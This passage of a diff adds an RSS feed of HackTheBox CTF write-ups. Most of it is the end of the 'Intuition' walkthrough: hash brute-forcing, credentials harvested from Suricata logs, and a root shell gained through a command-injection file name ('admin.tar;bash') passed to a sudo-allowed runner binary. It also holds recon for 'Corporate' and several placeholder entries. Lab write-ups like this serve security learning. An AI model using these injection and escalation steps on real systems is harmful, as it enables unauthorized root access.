+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Found match: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;guess&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;No match found.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Running this script generates the full &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_key&lt;/code&gt; for us.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-seedling fa-lg&quot; style=&quot;color: #98971a&quot;&gt;&lt;/i&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UHI75GHINKOP&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;You can also achieve this same technique with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt;.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-explosion&quot; style=&quot;color: #aec07c;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -a 3 -m 0 -1 ?u?d 0feda17076d793c2ef2870d7427ad4ed UHI75GHI?1?1?1?1&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Hashcat_Auth_Key.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-lateral-escalation&quot;&gt;&lt;i class=&quot;fa-solid fa-person-walking-arrow-loop-left&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; Lateral Escalation:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Checking under &lt;mark&gt;`/var/logs/suricata`&lt;/mark&gt; we find a lot of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gz&lt;/code&gt; compressed log files.&lt;br /&gt;
+&lt;i class=&quot;fa-solid fa-star&quot; style=&quot;color: #fabd2f;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Suricata&lt;/code&gt; is a threat detection and Analysis system that monitors network activity. Any network activity will have been logged into these files.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Suricata_Logs.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Lets grep across all these &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gz&lt;/code&gt; logs and see if we can find any interesting information.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zgrep -i password /var/log/suricata/*.gz&lt;/code&gt; to search .gz files&lt;br /&gt;
+    &lt;ul&gt;
+      &lt;li&gt;We get a ton of information with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;. But maybe theres a way to cut most of this out.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Checking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home&lt;/code&gt; we have a user named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lopez&lt;/code&gt; that has logged into this machine. Lets change our grep to look for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lopez&lt;/code&gt;.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zgrep -i lopez /var/log/suricata/*.gz&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;We get a more manageable output this time.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dev_acc@intuition:/var/log/suricata$ zgrep -i lopez  /var/log/suricata/*.gz   
+/var/log/suricata/eve.json.8.gz:{&quot;timestamp&quot;:&quot;2023-09-28T17:43:36.099184+0000&quot;,&quot;flow_id&quot;:1988487100549589,&quot;in_iface&quot;:&quot;ens33&quot;,&quot;event_type&quot;:&quot;ftp&quot;,&quot;src_ip&quot;:&quot;192.168.227.229&quot;,&quot;src_port&quot;:37522,&quot;dest_ip&quot;:&quot;192.168.227.13&quot;,&quot;dest_port&quot;:21,&quot;proto&quot;:&quot;TCP&quot;,&quot;tx_id&quot;:1,&quot;community_id&quot;:&quot;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&quot;,&quot;ftp&quot;:{&quot;command&quot;:&quot;USER&quot;,&quot;command_data&quot;:&quot;lopez&quot;,&quot;completion_code&quot;:[&quot;331&quot;],&quot;reply&quot;:[&quot;Username ok, send password.&quot;],&quot;reply_received&quot;:&quot;yes&quot;}}
+/var/log/suricata/eve.json.8.gz:{&quot;timestamp&quot;:&quot;2023-09-28T17:43:52.999165+0000&quot;,&quot;flow_id&quot;:1988487100549589,&quot;in_iface&quot;:&quot;ens33&quot;,&quot;event_type&quot;:&quot;ftp&quot;,&quot;src_ip&quot;:&quot;192.168.227.229&quot;,&quot;src_port&quot;:37522,&quot;dest_ip&quot;:&quot;192.168.227.13&quot;,&quot;dest_port&quot;:21,&quot;proto&quot;:&quot;TCP&quot;,&quot;tx_id&quot;:2,&quot;community_id&quot;:&quot;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&quot;,&quot;ftp&quot;:{&quot;command&quot;:&quot;PASS&quot;,&quot;command_data&quot;:&quot;Lopezzz1992%123&quot;,&quot;completion_code&quot;:[&quot;530&quot;],&quot;reply&quot;:[&quot;Authentication failed.&quot;],&quot;reply_received&quot;:&quot;yes&quot;}}
+/var/log/suricata/eve.json.8.gz:{&quot;timestamp&quot;:&quot;2023-09-28T17:44:32.133372+0000&quot;,&quot;flow_id&quot;:1218304978677234,&quot;in_iface&quot;:&quot;ens33&quot;,&quot;event_type&quot;:&quot;ftp&quot;,&quot;src_ip&quot;:&quot;192.168.227.229&quot;,&quot;src_port&quot;:45760,&quot;dest_ip&quot;:&quot;192.168.227.13&quot;,&quot;dest_port&quot;:21,&quot;proto&quot;:&quot;TCP&quot;,&quot;tx_id&quot;:1,&quot;community_id&quot;:&quot;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&quot;,&quot;ftp&quot;:{&quot;command&quot;:&quot;USER&quot;,&quot;command_data&quot;:&quot;lopez&quot;,&quot;completion_code&quot;:[&quot;331&quot;],&quot;reply&quot;:[&quot;Username ok, send password.&quot;],&quot;reply_received&quot;:&quot;yes&quot;}}
+/var/log/suricata/eve.json.8.gz:{&quot;timestamp&quot;:&quot;2023-09-28T17:44:48.188361+0000&quot;,&quot;flow_id&quot;:1218304978677234,&quot;in_iface&quot;:&quot;ens33&quot;,&quot;event_type&quot;:&quot;ftp&quot;,&quot;src_ip&quot;:&quot;192.168.227.229&quot;,&quot;src_port&quot;:45760,&quot;dest_ip&quot;:&quot;192.168.227.13&quot;,&quot;dest_port&quot;:21,&quot;proto&quot;:&quot;TCP&quot;,&quot;tx_id&quot;:2,&quot;community_id&quot;:&quot;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&quot;,&quot;ftp&quot;:{&quot;command&quot;:&quot;PASS&quot;,&quot;command_data&quot;:&quot;Lopezz1992%123&quot;,&quot;completion_code&quot;:[&quot;230&quot;],&quot;reply&quot;:[&quot;Login successful.&quot;],&quot;reply_received&quot;:&quot;yes&quot;}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;lopez-login&quot;&gt;Lopez Login:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Checking the logs we can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lopez&lt;/code&gt; password was recorded in plain text.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-seedling fa-lg&quot; style=&quot;color: #98971a&quot;&gt;&lt;/i&gt;  password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lopezz1992%123&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;-recon-2&quot;&gt;&lt;i class=&quot;fa-solid fa-feather-pointed&quot; style=&quot;color: #aec07c;&quot;&gt;&lt;/i&gt; Recon:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Checking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lopez&lt;/code&gt; we see that they can run the app &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runner2&lt;/code&gt; with escalated permissions.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Matching Defaults entries for lopez on intuition:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User lopez may run the following commands on intuition:
+    (ALL : ALL) /opt/runner2/runner2
+    
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lopez&lt;/code&gt; is also apart of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys-adm&lt;/code&gt; group.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id lopez&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uid=1003(lopez) gid=1003(lopez) groups=1003(lopez),1004(sys-adm)
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;cve-2023-5115&quot;&gt;CVE-2023-5115:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Looking for a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE&lt;/code&gt; related to ansible roles we find a relatively recent CVE exploiting path traversal within a playbook that allows us to change the symlink to overwrite a file outside the extraction path.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-5115&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2023-5115&lt;/a&gt;&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://security.snyk.io/vuln/SNYK-PYTHON-ANSIBLE-5917149&quot;&gt;https://security.snyk.io/vuln/SNYK-PYTHON-ANSIBLE-5917149&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Arbitrary files the user has access to can be overwritten. The malicious role must contain a symlink with an absolute path to the target file, followed by a file of the same name (as the symlink) with the contents to write to the target.&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Basically we need to create a role with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path/cmd&lt;/code&gt; we want to exploit in the role and also the NAME of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.tar&lt;/code&gt; file we are using to exploit the role in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;role_file&lt;/code&gt; key of ansible script.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Another note to make is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ansible-galaxy&lt;/code&gt; will check for valid compression before loading the file so we must use a known valid format to craft our payload.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Looking around we find this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sys admins Role&lt;/code&gt; playbook we can take advantage of.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://github.com/coopdevs/sys-admins-role/&quot;&gt;https://github.com/coopdevs/sys-admins-role/&lt;/a&gt;&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz&quot;&gt;https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;ansible-role-injection&quot;&gt;Ansible Role Injection:&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Now that we have a valid compressed file we need to create our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ansible structured json file&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nano root.json
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We need to paste the following information into the json file.
+    &lt;ul&gt;
+      &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;action&lt;/code&gt; to take when running the playbook. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install&lt;/code&gt; which will install the role.&lt;/li&gt;
+      &lt;li&gt;The File name and command to run when loaded.&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.tar.gz;bash&lt;/code&gt; - This will give us a root bash shell when ran.&lt;/li&gt;
+      &lt;li&gt;and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_code&lt;/code&gt; we found earlier in the ``&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{  
+        &quot;run&quot;:{  
+                &quot;action&quot;:&quot;install&quot;,  
+                &quot;role_file&quot;:&quot;admin.tar;bash&quot;  
+        },  
+        &quot;auth_code&quot;:&quot;UHI75GHINKOP&quot;  
+}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.tar&lt;/code&gt; file from the github archive.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget https://github.com/coopdevs/ansible-role-template/archive/refs/tags/v1.0.0.tar.gz&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Then rename it to make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;role_file&lt;/code&gt; path name.
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mv v0.0.3.tar admin.tar.gz&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Unzip to get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.tar&lt;/code&gt; file.&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gunzip -d admin.tar.gz&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;root-elevation&quot;&gt;Root Elevation:&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Now upload the two files to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lopez&lt;/code&gt; home directory.
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp admin.tar lopez@comprezzor.htb:/home/lopez/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp root.json lopez@comprezzor.htb:/home/lopez/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Now lets elevate our current shell to root with the injected role.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; We need to rename the file once on the victim to match the file path in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;json&lt;/code&gt; to get the command injection.
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp admin.tar &quot;admin.tar;bash&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Then we can run the app with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.json&lt;/code&gt; playbook to get our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root bash shell&lt;/code&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo /opt/runner2/runner2 root.json
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Root_Runner_Exploit.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Now we can cat out the root flag.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Root_Shell.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;rooted&quot;&gt;Rooted:&lt;/h1&gt;
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-star&quot; style=&quot;color: #fabd2f;&quot;&gt;&lt;/i&gt; We have direct access to a  shell with root access in the management console.&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;RootText: 148a0b3e5da26e722b121a64353372e1&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Wed, 07 Aug 2024 18:47:47 -0400</pubDate>
+        <link>http://localhost:4000/Intuition</link>
+        <guid isPermaLink="true">http://localhost:4000/Intuition</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Season 5 Anomalies</category>
+        
+        <category>Linux</category>
+        
+        <category>Hard</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Compiled</title>
+        <description>&lt;h1 id=&quot;place-holder&quot;&gt;Place Holder&lt;/h1&gt;
+</description>
+        <pubDate>Wed, 07 Aug 2024 18:20:00 -0400</pubDate>
+        <link>http://localhost:4000/Compiled</link>
+        <guid isPermaLink="true">http://localhost:4000/Compiled</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Post Season</category>
+        
+        <category>Windows</category>
+        
+        <category>Medium</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Corporate</title>
+        <description>&lt;h1 id=&quot;machine-info&quot;&gt;Machine Info&lt;/h1&gt;
+&lt;h5 id=&quot;rating-insane--platform-linux&quot;&gt;Rating: Insane ; Platform: Linux&lt;/h5&gt;
+&lt;blockquote&gt;
+Corporate is an insane-difficulty Linux machine featuring a feature-rich web attack surface that requires chaining various vulnerabilities to bypass strict Content Security Policies (CSP) and steal an authentication cookie via Cross-Site Scripting (XSS). This results in staff-level access to internal web applications, from where a file-sharing service&apos;s access controls can be bypassed to access other users files. This leads to an onboarding document revealing the default password template. Password spraying the SSO endpoint returns valid credentials, which can be used to SSH into a workstation that authenticates via LDAP. Data in the users home directory can be used to brute force the pin to a Bitwarden vault, enabling the attacker to pass multi-factor authentication (MFA) on Gitea and enumerate private repositories, discovering a private key used to sign JWT tokens. Forging a token and authenticating as a user in the engineering group, the LDAP password is changed to obtain system access to the group and a docker socket, which is leveraged to obtain `root` privileges inside a `Proxmox` environment. The container is escaped using a private SSH key belonging to the sysadmin group. Finally, [CVE-2022-35508](https://nvd.nist.gov/vuln/detail/CVE-2022-35508) is used to exploit PVE and obtain access to the `root` account on the host machine. 
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h1&gt;
+&lt;h5 id=&quot;nmapping&quot;&gt;Nmapping:&lt;/h5&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt; nmap -sC -sV -A BoxIpAddress &amp;gt; CorporateNmap.txt &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;PORT   STATE SERVICE VERSION
+80/tcp open  http    OpenResty web app server 1.21.4.3
+|_http-title: Corporate.HTB&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It appears we have only one port worth looking into. There is a web server running offering up a website on port 80.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The title of the website is: Corporate.HTB&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h5 id=&quot;ffufing&quot;&gt;Ffufing:&lt;/h5&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt; ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://corporate.htb -H &apos;Host: FUZZ.corporate.htb&apos; -fs 175
+ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;b&gt;Subdomains:&lt;/b&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;support.corporate.htb&lt;/li&gt;
+  &lt;li&gt;git.corporate.htb&lt;/li&gt;
+  &lt;li&gt;sso.corporate.htb&lt;/li&gt;
+  &lt;li&gt;people.corporate.htb&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Lets add these subdomains to your &lt;mark&gt;/etc/hosts&lt;/mark&gt; file.&lt;/p&gt;
+
+&lt;h5 id=&quot;-web-exploration&quot;&gt;🐸 Web Exploration:&lt;/h5&gt;
+&lt;p&gt;After poking around the main site some we find a chat bot. It appears to be located at the &lt;a href=&quot;http://support.corporate.htb&quot;&gt;&lt;/a&gt; subdomain.&lt;/p&gt;
+
+&lt;p&gt;We are able to send some “html” scripts to the bot and it relays them back to us. It appears this bot maybe vulnerable to some &lt;bold&gt;XSS Injection&lt;/bold&gt;.
+After attempting some scripts I noticed that the bot is parsing javascript. We attempt some simple javascript xss but looking at the response we notice that the scirpts are being blocked by &lt;bold&gt;CSA&lt;/bold&gt; or Content-Secutiry-Policy.
+You can read more about CSA here &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;Testing another block quote. I wonder how this will look.&lt;/blockquote&gt;
+</description>
+        <pubDate>Wed, 07 Aug 2024 17:03:00 -0400</pubDate>
+        <link>http://localhost:4000/Corporate</link>
+        <guid isPermaLink="true">http://localhost:4000/Corporate</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Retired</category>
+        
+        <category>Windows</category>
+        
+        <category>Insane</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>PermX</title>
+        <description>&lt;h1 id=&quot;place-holder&quot;&gt;Place Holder&lt;/h1&gt;
+</description>
+        <pubDate>Wed, 07 Aug 2024 16:43:35 -0400</pubDate>
+        <link>http://localhost:4000/PermX</link>
+        <guid isPermaLink="true">http://localhost:4000/PermX</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Season 5 Anomalies</category>
+        
+        <category>Medium</category>
+        
+        <category>Linux</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Ghost</title>
+        <description>&lt;h1 id=&quot;place-holder&quot;&gt;Place Holder&lt;/h1&gt;
+</description>
+        <pubDate>Wed, 07 Aug 2024 16:30:35 -0400</pubDate>
+        <link>http://localhost:4000/Ghost</link>
+        <guid isPermaLink="true">http://localhost:4000/Ghost</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Season 5 Anomalies</category>
+        
+        <category>Insane</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Blazorized</title>
+        <description>&lt;h1 id=&quot;place-holder&quot;&gt;Place Holder&lt;/h1&gt;
+</description>
+        <pubDate>Wed, 07 Aug 2024 16:30:35 -0400</pubDate>
+        <link>http://localhost:4000/Blazorized</link>
+        <guid isPermaLink="true">http://localhost:4000/Blazorized</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Season 5 Anomalies</category>
+        
+        <category>Medium</category>
+        
+        <category>Windows</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>GreenHorn</title>
+        <description>&lt;h1 id=&quot;place-holder&quot;&gt;Place Holder&lt;/h1&gt;
+</description>
+        <pubDate>Wed, 07 Aug 2024 16:21:35 -0400</pubDate>
+        <link>http://localhost:4000/GreenHorn</link>
+        <guid isPermaLink="true">http://localhost:4000/GreenHorn</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Post Season</category>
+        
+        <category>Easy</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Resource</title>
+        <description>&lt;h1 id=&quot;place-holder&quot;&gt;Place holder&lt;/h1&gt;
+</description>
+        <pubDate>Wed, 07 Aug 2024 16:10:00 -0400</pubDate>
+        <link>http://localhost:4000/Resource</link>
+        <guid isPermaLink="true">http://localhost:4000/Resource</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Medium</category>
+        
+        <category>Season 6 Hiest</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Axlle</title>
+        <description>&lt;h1 id=&quot;place-holder&quot;&gt;Place Holder&lt;/h1&gt;
+</description>
+        <pubDate>Wed, 07 Aug 2024 16:01:35 -0400</pubDate>
+        <link>http://localhost:4000/Axlle</link>
+        <guid isPermaLink="true">http://localhost:4000/Axlle</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Hard</category>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
